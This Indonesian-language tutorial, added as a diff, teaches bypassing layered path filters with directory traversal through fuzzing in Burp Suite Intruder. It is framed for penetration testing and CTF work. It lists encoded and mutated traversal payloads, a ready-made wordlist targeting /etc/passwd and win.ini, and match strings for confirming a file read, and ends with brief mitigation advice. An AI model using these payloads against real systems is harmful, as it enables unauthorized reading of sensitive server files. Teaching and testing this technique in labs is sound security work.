@@ -1,0 +1,188 @@
+# Directory Traversal: Menembus Extreme Filtering Menggunakan Burp Intruder & Automated Fuzzing
+
+Dalam skenario pengujian penetrasi (_penetration testing_) maupun kompetisi CTF tingkat lanjut, kita sering berhadapan dengan **Extreme Filtering**—kondisi di mana sistem target menerapkan pertahanan berlapis sekaligus:
+1. **Web Application Firewall (WAF)** yang memblokir sekuens `../` dan `%2e%2e%2f`.
+2. **Reverse Proxy / Load Balancer** yang melakukan dekode atau normalisasi parsial.
+3. **Backend Middleware** yang menghapus pola non-rekursif (`....//`).
+4. **Validasi Aplikasi** yang mewajibkan awalan folder tertentu (`/var/images/`) dan akhiran ekstensi (`.png`).
+
+Mencoba ratusan kombinasi payload mutasi secara manual menggunakan Repeater akan sangat lambat dan melelahkan. Di sinilah peran **Burp Suite Intruder** dan teknik **Automated Fuzzing** menjadi senjata utama untuk menemukan kombinasi payload mutasi yang berhasil menembus celah filter.
+
+---
+
+## 1. Konsep Dasar: Mengapa Extreme Filtering Membutuhkan Fuzzing?
+
+Pertahanan berlapis sering kali mengalami **Parser Mismatch Discrepancy** (ketidaksesuaian cara kerja antara parser WAF, framework backend, dan kernel sistem operasi):
+
+```text
+[Klien / Attacker]
+       │ (Payload Mutasi Kompleks)
+       ▼
+[ WAF Layer (Cloudflare/AWS) ] ── (Memeriksa payload ter-encode, tidak melihat pola ../)
+       │ (Lolos)
+       ▼
+[ Reverse Proxy (Nginx) ] ────── (Melakukan Decode Pass 1)
+       │
+       ▼
+[ Backend Framework (Java/Node)] (Melakukan Unicode Normalization / Stripping)
+       │
+       ▼
+[ OS Filesystem Kernel (POSIX) ] (Mengeksekusi traversal murni ke /etc/passwd!)
+```
+
+Karena kita tidak selalu mengetahui urutan tepat dari pemrosesan di sisi server, kita menggunakan teknik **fuzzing terarah** dengan ratusan payload mutasi untuk menemukan kombinasi yang lolos dari seluruh rantai filter.
+
+---
+
+## 2. Alur Eksploitasi: Fuzzing Menggunakan Burp Intruder
+
+![Directory Traversal Intruder Fuzzing](/images/directory-traversal-intruder-fuzzing.svg)
+
+---
+
+## 3. Matriks Mutasi Payload untuk Extreme Filtering
+
+Berikut adalah kategori payload mutasi yang wajib dimasukkan ke dalam daftar fuzzing:
+
+---
+
+### Kategori 1: Multi-Layer URL Encoding
+Digunakan saat request melewati reverse proxy atau gateway yang melakukan dekode sebelum diteruskan ke backend:
+- **Single URL Encode:** `%2e%2e%2f` atau `%2e%2e/`
+- **Double URL Encode:** `%252e%252e%252f` atau `..%252f`
+- **Triple URL Encode:** `%25252e%25252e%25252f`
+
+---
+
+### Kategori 2: 16-Bit Unicode, Overlong UTF-8, & Normalization
+Digunakan untuk mengecoh filter WAF berbasis regex yang gagal menangani representasi karakter multi-byte:
+- **16-Bit Unicode:** `%u002e%u002e%u002f` atau `%u002e%u002e%u2215` (Division slash)
+- **Overlong UTF-8 (2-Byte):** `%c0%ae%c0%ae%c0%af`
+- **Overlong UTF-8 (3-Byte):** `%e0%80%ae%e0%80%ae%e0%80%af`
+- **Unicode Fullwidth Normalization:** `\uFF0E\uFF0E\uFF0F` (Karakter fullwidth dots yang diubah menjadi `..` oleh normalizer Java/Node.js setelah melewati filter regex).
+
+---
+
+### Kategori 3: Mixed Slashes & Windows NTFS Obfuscation
+Digunakan pada server Windows atau framework yang mendukung pemisah direktori ganda:
+- **Mixed Separators:** `..\..\..\etc\passwd` atau `..\/..\/..\etc/passwd`
+- **URL-Encoded Mixed:** `..%5c..%5c` atau `%2e%2e%5c%2e%2e%2f`
+- **NTFS Stream Suffix:** `..\..\windows\win.ini::$DATA` atau `..\..\boot.ini...`
+
+---
+
+### Kategori 4: Hybrid Mutation (Kombinasi Ekstrem)
+Menggabungkan semua teknik (Prefix + Nested + Encoding + Null Byte):
+```text
+/var/www/images/....//....//%252e%252e/etc/passwd%00.jpg
+/var/www/images/..%252f..%252f..%252fetc/passwd?.png
+/images/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%23.jpg
+```
+
+---
+
+## 4. Praktik Langkah Demi Langkah Menggunakan Burp Suite Intruder
+
+Berikut panduan langkah demi langkah melakukan automated fuzzing Directory Traversal:
+
+---
+
+### Langkah 1: Tangkap Request dan Kirim ke Intruder
+1. Akses aplikasi target melalui browser bawaan **Burp Suite**.
+2. Cari request pemanggilan berkas pada tab **Proxy** > **HTTP history** (`GET /image?filename=default.png`).
+3. Klik kanan request tersebut dan pilih **Send to Intruder** (`Ctrl + I` / `Cmd + I`).
+4. Masuk ke tab **Intruder**.
+
+---
+
+### Langkah 2: Atur Posisi Payload (Sniper Marker §)
+1. Buka sub-tab **Positions**.
+2. Pilih Attack Type: **Sniper** (menguji satu parameter secara berurutan).
+3. Tandai nilai parameter `filename` dengan marker `§`:
+   ```http
+   GET /image?filename=§default.png§ HTTP/1.1
+   Host: target-lab.com
+   Cookie: session=xyz...
+   ```
+
+---
+
+### Langkah 3: Masukkan Daftar Wordlist Payload
+1. Masuk ke sub-tab **Payloads**.
+2. Di bagian **Payload settings [Simple list]**, kamu dapat:
+   - Mengklik **Load...** dan memilih wordlist Directory Traversal standar (seperti `SecLists/Fuzzing/traversal.txt`).
+   - Atau menyalin (*Paste*) daftar payload mutasi yang telah disiapkan.
+
+---
+
+### Langkah 4: Konfigurasi Payload Encoding (KRUSIAL ⚠️)
+1. Gulir ke bawah pada sub-tab **Payloads** hingga menemukan bagian **Payload Encoding**.
+2. **HAPUS CENTANG (UNCHECK)** pada opsi:
+   ```text
+   [ ] URL-encode these characters: ...
+   ```
+> [!WARNING]
+> **PENTING:** Jika opsi ini dibiarkan tercentang, Burp Suite akan secara otomatis meng-encode karakter `%` pada payload double encode (`%252e`) menjadi `%25252e`, sehingga payload mutasi yang kamu rancang akan rusak sebelum sampai ke server!
+
+---
+
+### Langkah 5: Konfigurasi Grep - Match untuk Deteksi Otomatis
+1. Buka sub-tab **Settings** (atau **Options** pada versi lama).
+2. Gulir ke bagian **Grep - Match**.
+3. Klik **Add** dan masukkan kata kunci keberhasilan pembacaan file sistem:
+   - `root:x:0:0:` (Indikator pembacaan `/etc/passwd` di Linux)
+   - `[extensions]` atau `[fonts]` (Indikator pembacaan `win.ini` di Windows)
+   - `daemon:x`
+   - `/bin/bash`
+4. Pastikan opsi **Match type: Simple string** dipilih.
+
+---
+
+### Langkah 6: Jalankan Serangan (Start Attack)
+1. Klik tombol **Start attack** di pojok kanan atas.
+2. Jendela hasil serangan (*Intruder Attack Window*) akan muncul dan menjalankan request secara otomatis.
+
+---
+
+### Langkah 7: Analisis Hasil Serangan & Identifikasi Payload Juara
+1. Di jendela hasil serangan, perhatikan kolom-kolom berikut:
+   - **Grep - Match Column:** Cari baris yang memiliki tanda centang `[✓]`.
+   - **Status Column:** Filter baris dengan status `200 OK`.
+   - **Length Column:** Urutkan berdasarkan panjang respons (*Response Length*). Respons yang berhasil membaca `/etc/passwd` biasanya memiliki panjang yang berbeda signifikan dari respons error 400/404.
+2. Klik baris yang memiliki tanda centang `[✓]`.
+3. Periksa panel **Response** untuk memastikan berkas `/etc/passwd` berhasil terekstrak!
+
+---
+
+## 5. Ringkasan Wordlist Fuzzing Siap Pakai
+
+Berikut 15 payload mutasi esensial yang dapat kamu simpan sebagai wordlist cepat:
+
+```text
+/etc/passwd
+/etc/passwd%00.png
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../../etc/passwd
+....//....//....//etc/passwd
+....//....//....//etc/passwd%00.png
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd%00.jpg
+/var/www/images/../../../etc/passwd
+/var/www/images/....//....//....//etc/passwd
+/var/www/images/%252e%252e%252f%252e%252e%252fetc/passwd%00.png
+..%5c..%5c..%5cwindows/win.ini
+```
+
+---
+
+## 6. Panduan Mitigasi Komprehensif (Defense-in-Depth)
+
+1. **Gunakan Canonical Containment Check (`startsWith(BASE_DIR + path.sep)`):**
+   Normalisasi semua path menggunakan `path.resolve()` atau `realpath()`, lalu pastikan bahwa jalur absolut berkas berada di dalam folder yang sah.
+2. **Gunakan Whitelist Alfanumerik Murni:**
+   Tolak semua input yang mengandung karakter selain `[a-zA-Z0-9_-]`.
+3. **Petakan Berkas Melalui Database UUID:**
+   Simpan berkas fisik menggunakan UUID acak dan akses berkas melalui ID database alih-alih mengekspos nama berkas langsung kepada pengguna.
